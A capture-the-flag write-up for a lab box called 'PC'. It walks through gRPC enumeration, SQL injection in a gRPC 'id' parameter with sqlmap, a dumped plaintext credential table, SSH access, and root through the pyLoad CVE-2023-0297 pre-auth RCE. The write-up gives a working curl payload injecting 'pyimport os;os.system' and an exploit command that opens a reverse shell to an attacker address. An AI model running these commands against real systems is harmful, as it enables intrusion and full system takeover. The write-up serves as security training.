## the box

PC is a Linux box with only two interesting ports: SSH on `22` and an unknown service on `50051`. nmap could not fingerprint `50051`, but the raw bytes in the probe response showed HTTP/2 framing, which pointed at gRPC.

## recon

Telnet to `50051` returned `Did not receive HTTP/2 settings before handshake timeout`, confirming gRPC. I used `grpcurl` with `-plaintext` since the server ran HTTP/2 without TLS. Reflection was enabled, so I could list and describe the service.

```
grpcurl -plaintext 10.129.229.124:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection

grpcurl -plaintext 10.129.229.124:50051 describe SimpleApp
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
```

`getInfo` complained about a missing `token` header, so I needed to authenticate first. Login refused unknown users, so I registered an account, then logged in to get a JWT back in the response. I switched to `grpcui` for a browser UI to make this easier. One catch: the app resets accounts every few minutes, so the token goes stale and I had to re-register and re-login periodically while working. That returned an id and a JWT to put in the `token` metadata header.

```
{ "message": "Your id is 279." }
token b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...'
```

## foothold

`getInfo` takes the JWT in `token` metadata and an `id` in the data body. I proxied the grpcui request through Burp and fed it to sqlmap, marking the JSON parameters with `*`. sqlmap found the injection in the `id` value.

```
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Payload: {"metadata":[{"name":"token","value":"<jwt>"}],"data":[{"id":"52 AND 1828=1828"}]}
```

The back-end was SQLite, so I dumped tables directly.

```
sqlmap -r /tmp/req.sql -T accounts -C username,password --dump-all --threads 10
```

```
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+
```

## user

`sau:HereIsYourPassWord1431` worked over SSH and gave the user flag.

```
ssh sau@10.129.229.124
```

## root

Checking listening sockets, `127.0.0.1:8000` was bound locally and not exposed externally:

```bash
netstat -tnlp
```

I forwarded it back over SSH.

```bash
ssh -L 8000:127.0.0.1:8000 sau@10.129.229.124
```

The local service was a pyLoad web interface. pyLoad also binds its Click'n'Load port `9666`, and the same `addcrypted2` exploit works against either port. pyLoad is vulnerable to CVE-2023-0297, an unauthenticated pre-auth RCE. The `/flash/addcrypted2` endpoint passes the `jk` parameter into `js2py.eval_js`, and `js2py` ships `pyimport` by default, which imports real Python modules. So `pyimport os; os.system(...)` in `jk` runs OS commands as the pyLoad user, which is root here. The bare request looks like:

```bash
curl -d 'jk=pyimport os;os.system("touch /tmp/pwn");f=function f2(){};&package=x&crypted=AAAA&passwords=aaaa' http://127.0.0.1:8000/flash/addcrypted2
```

I ran a public exploit wrapping that against the forwarded port with a listener of my own.

```bash
python3 exploit.py -t http://127.0.0.1:8000/ -I 10.10.16.7 -P 1337
```

That landed a shell as root and the root flag.

## takeaway

Reflection on a gRPC endpoint handed me the whole service definition, and an injectable id parameter behind a JWT was still injectable. The privesc was a known CVE in an admin panel that was only reachable from localhost, which is why an SSH tunnel mattered.
